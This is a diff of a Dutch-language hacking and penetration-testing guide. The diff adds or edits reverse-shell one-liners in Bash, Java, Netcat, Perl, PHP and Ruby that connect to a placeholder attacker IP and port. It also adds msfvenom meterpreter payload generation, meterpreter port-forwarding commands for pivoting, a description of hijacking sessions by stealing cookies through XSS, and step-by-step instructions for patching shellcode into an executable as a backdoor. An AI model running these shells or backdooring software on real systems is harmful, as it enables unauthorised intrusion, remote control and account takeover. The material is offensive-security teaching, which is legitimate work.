@@ -110,31 +110,35 @@ Hieronder zal ik er een aantal plaatsen:
 ### Bash
 
     exec /bin/bash 0&0 2>&0 
-    bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+    bash -i >& /dev/tcp/< ip >/< port > 0>&1
 
 ### Java
     r = Runtime.getRuntime()
-    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/< ip >/< port >;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
     p.waitFor()
 
 ### Netcat
 
-    nc -e /bin/sh ATTACKING-IP 80
+    nc -e /bin/sh < ip > < port >
 
 ### Perl
 
-    perl -e 'use Socket;$i="IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+    perl -e 'use Socket;$i="< ip >";$p=< port >;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 ### [PHP](https://www.php.net)
 
-    php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+    php -r '$sock=fsockopen("< ip >",< port >);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ### Ruby ###
 
-    ruby -rsocket -e'f=TCPSocket.open("<ip>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+    ruby -rsocket -e'f=TCPSocket.open("< ip >",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 ## MSFVenom ##
-Msfvenom is de payloadgenerator van het Metasploit Framework. Met deze payloadgenerator kan je eenvoudig code genereren die diverse soorten backdoors, reverse shells of andere toepassingen bieden. 
+Msfvenom is de payloadgenerator van het Metasploit Framework. Met deze payloadgenerator kan je eenvoudig code genereren die diverse soorten backdoors, reverse shells of andere toepassingen. Een handige manier om een payload te genereren om in buffer overflows te gebruiken is:
+
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=< ip > LPORT=< port > -f hex
+
+De "-f hex" zorgt er in dit geval voor dat de payload direct hexadecimaal te kopieren geplakt word. Deze variant kan je ook makkelijker gebruiken voor het direct in een executable patchen van een shell.
 
 ### Linux ###
 
@@ -334,7 +338,14 @@ Als je dan op de webserver de file shell.php opvraagt met als querystring c=ls d
 
 ### Authenticatiefouten ###
 
-### Sessie managment ###
+### Sessie management ###
+Veel webapplicaties maken gebruik van sessies om de gebruikerservaring te verbeteren. In dit soort sessies worden bijvoorbeeld de gebruikersgegevens over authenticatie en identificatie opgeslagen. Hiermee kan een website bepalen tegen welke gebruiker hij praat en of deze gebruiker al dan niet ingelogged is. 
+
+De identifiers van deze sessies worden in een cookie opgeslagen. Deze gegevens moeten met elke pagina refresh meegezonden worden omdat een HTTP request in zichzelf stateless is.
+
+In PHP heten deze session, standaard, cookies PHPSESSIONID en in Java JSESSIONID.
+
+Als je door middel van, bijvoorbeeld, XSS de session id's kan stelen is het in sommige webapplicaties mogelijk om jezelf voor te doen als een andere gebruiker. Krijg je zo de cookies van een administrator te pakken, dan kan je de gehele website overnemen.
 
 ### NoSQL ###
 
@@ -657,7 +668,7 @@ Geavanceerde hacktools om pash the hash mee te doen? PSExec [Windows Sysinternal
 
 ## Pivoting ##
 
-## Port forwarding ##
+## Iptables port forwarding ##
 Alhoewel mensen vaak denken dat de [iptables](https://en.wikipedia.org/wiki/Iptables) alleen gebruikt kunnen worden om als firewall te dienen, kun je met iptables ook [port forwarding](https://nl.wikipedia.org/wiki/Port_forwarding) toepassen. Dit doe je doormiddel van, onder andere, de prerouting chain. Hiermee kun je de packets die aan de rule voldoen aan laten passen, voordat ze verwerkt worden door het besturingssysteem. Dit doe je overigens wel door de iptables van de host waar je overheen wilt pivotten aan te passen.
 
     iptables -t nat -A PREROUTING -p tcp -d < ServerIP > --dport < ServerPoort > -j DNAT --to-destination < EinddoelIP >:< EinddoelPort >
@@ -675,6 +686,20 @@ Om dit te voorkomen gaan we de computer ook nog toestemming geven om pakketten d
 Zo niet, zet dan de waarde op 1. 
 
 Als je dit voor een webserver doet, kan je vervolgens gewoon naar http://< ServerIP >:< ServerPoort > surfen en dan zal je de pagina zien die op http://< EinddoelIP >:< EinddoelPort > draait.
+
+## Meterpreter port forwarding ##
+Als je gebruik maakt van meterpreter als shell dan zijn er standaard mogelijkheden om portforwarding toe te passen. Hiervoor kan je het commando portfwd. Deze methode gebruik je als volgt:
+
+    portfwd add -L < lokale IP > -l < lokale poort > -r < remote IP > -p < remote poort > 
+
+Bij het lokale IP, gaat het om het IP adres van de machine waar je metasploit op hebt draaien. Je hoeft deze niet persé op te geven.
+
+Wil je de portforward weer weghalen, dan gebruik je bijna hetzelfde commando als hierboven maar vervang je add voor delete.
+
+Een overzicht van alle actieve portforwards kan je opvragen door het list argument mee te geven, alles verwijderen doe je met het flush argument:
+
+	portfwd list
+	portfwd flush  
 
 ## SSH ##
 
@@ -739,27 +764,32 @@ Voor deze oefening maken we een payload aan met MSFvenom. Deze payload is een wi
 De hexcode die je terug krijgt plak je even in je notitieblokje.
 
 **De shellcode plaatsen**
-Om de shellcode te plaatsen, en na het uitvoeren de applicatie ook weer correct te kunnen draaien, zullen wij eerst de registers en de flags moeten opslaan. Om de registers op te slaan maken wij gebruik van de assembly instructie PUSHAD. PUSHAD staat ons toe om in 1 instructie alle registers op de stack te pushen, (EAX, ECX, EDX, EBX, ESP, EBP, ESI en EDI) en PUSHFD doet hetzelfde, maar dan voor alle flags.
+Om de shellcode te plaatsen, en na het uitvoeren de applicatie ook weer correct te kunnen draaien, zullen wij eerst de registers en de [EFLAGS](https://en.wikipedia.org/wiki/FLAGS_register) moeten opslaan. Om de [registers](https://en.wikipedia.org/wiki/X86#Purpose) op te slaan maken wij gebruik van de assembly instructie PUSHAD. PUSHAD staat ons toe om in 1 instructie alle registers op de stack te pushen, (EAX, ECX, EDX, EBX, ESP, EBP, ESI en EDI) en PUSHFD doet hetzelfde, maar dan voor alle EFLAGS.
 
 Hierna selecteer je de met MSFVenom gegenereerde shellcode, deze plak je met een binairy paste direct achter de PUSHFD. Je zult nu zien dat je shellcode verschijnt. Sla de aanpassingen wederom op en herstart de applicatie. Druk op F9, F7 en zet een breakpoint op de eerste regel van je shellcode. Druk nogmaals op F9. Je zult zien dat je programma nu tot aan de eerste regel van de assembly uitgevoerd is. Kijk naar de registerwaarde van ESP. Noteer deze, die gaan we later gebruiken om de stack weer te alignen.
 
 Scroll nu naar het einde van je shellcode, zet direct na de shellcode een breakpoint. Druk nu op F9, en kijk weer naar de waarde van ESP. Je zult zien dat deze waarde kleiner is dan de waarde die je eerst had. Dit is het aantal bytes die je op de stack opgeschoven bent. Aangezien wij willen dat het programma weer normaal uit kan voeren is het noodzakelijk dat wij de registers terug gaan zetten. Om de registers terug te zetten moeten wij alleen wel de stackpointer zo hebben staan dat wij de juiste waarden terug POP'en.
 
 Om de offset te berekenen openen wij in windows de calculator en zetten wij hem in de hexadecimale modus:
+
 	< Eerste ESP > - < Tweede ESP > = offset
 
 Wij gaan dit getal nu automatisch in assembly bij de ESP op laten tellen, direct na de shellcode dubbelklikken wij dus en tikken wij:
+
     ADD ESP,0< offset >
 
 Als ESP weer goed gaat, gaan we in omgekeerde volgorde de flags en registers weer terug zetten:
+
     POPFD
 	POPAD
 
 **Execution flow herstellen**
 Om te zorgen dat het programma waar wij onze backdoor in plaatsen, zonder foutmeldingen, blijft functioneren moeten wij de overschreven instructie weer aanroepen. Je moet een CALL doen op de eerste functie die je helemaal aan het begin in een notepad had geplakt (denk aan ASLR). We plaatsen dus het volgende:
+
     CALL < adres >
 
 en om te zorgen dat het programma hierna de rest van de flow oppakt jumpen wij naar de tweede instructie (denk aan ASLR) toe:
+
 	JMP < adres tweede instructie >
 
 ## Geheugenbeheer ##
